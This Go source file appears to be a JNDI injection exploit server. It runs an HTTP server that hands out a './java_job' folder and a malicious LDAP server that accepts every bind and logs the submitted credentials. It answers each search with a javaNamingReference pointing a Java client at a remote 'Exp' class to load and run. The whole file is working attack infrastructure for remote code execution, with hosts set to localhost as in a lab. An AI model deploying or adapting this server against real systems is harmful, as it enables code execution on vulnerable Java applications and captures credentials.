package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"

	ldap "github.com/vjeantet/ldapserver"
)

func logger(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Println("http server", r.Method, r.URL.Path)
		handler.ServeHTTP(w, r)
	})
}

func httpMain() {
	http.ListenAndServe(":8080", logger(http.FileServer(http.Dir("./java_job"))))
}

func main() {
	go httpMain()

	//ldap logger
	ldap.Logger = log.New(os.Stdout, "[ldap server] ", log.LstdFlags)

	//Create a new LDAP Server
	server := ldap.NewServer()

	routes := ldap.NewRouteMux()
	routes.Bind(handleBind)
	routes.Search(handleSearch)
	server.Handle(routes)

	// listen on 10389
	go server.ListenAndServe("127.0.0.1:8081")

	// When CTRL+C, SIGINT and SIGTERM signal occurs
	// Then stop server gracefully
	ch := make(chan os.Signal)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	close(ch)

	server.Stop()
}

// handleBind return Success if login == mysql
func handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetBindRequest()
	res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	log.Printf("Bind Success User=%s, Pass=%s", string(r.Name()), string(r.AuthenticationSimple()))

	w.Write(res)
}

func handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetSearchRequest()
	log.Printf("%+v", r)

	e := ldap.NewSearchResultEntry("Exp")
	e.AddAttribute("javaClassName", "Exp")
	e.AddAttribute("javaCodeBase", "http://127.0.0.1:8080/")
	e.AddAttribute("objectClass", "javaNamingReference")
	e.AddAttribute("javaFactory", "Exp")
	w.Write(e)
	res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}
